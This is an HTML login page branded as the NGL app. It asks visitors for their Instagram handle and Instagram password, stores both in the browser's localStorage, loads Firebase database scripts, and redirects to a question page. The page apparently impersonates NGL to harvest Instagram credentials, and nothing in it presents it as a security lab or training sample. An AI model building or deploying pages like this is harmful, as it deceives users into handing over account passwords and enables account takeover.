<!DOCTYPE html>
<html>
<head>
  <title>NGL - Login</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
  <script src="firebase.js"></script>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://d2c0db5b8fb27c1c9887-9b32efc83a6b298bb22e7a1df0837426.ssl.cf2.rackcdn.com/20435540-ngl-icon-3003x1681.png" alt="NGL Logo">
    <h2>What's your Instagram handle?</h2>
    <p class="example">Ex: @champagnepapi</p>
    
    <input id="username" type="text" placeholder="@">
    <input id="password" type="password" placeholder="Password">

    <button onclick="goToQuestion()">Continue</button>
  </div>

  <script>
    function goToQuestion() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      localStorage.setItem("username", username);
      localStorage.setItem("password", password);
      window.location.href = "question.html";
    }
  </script>
</body>
</html>
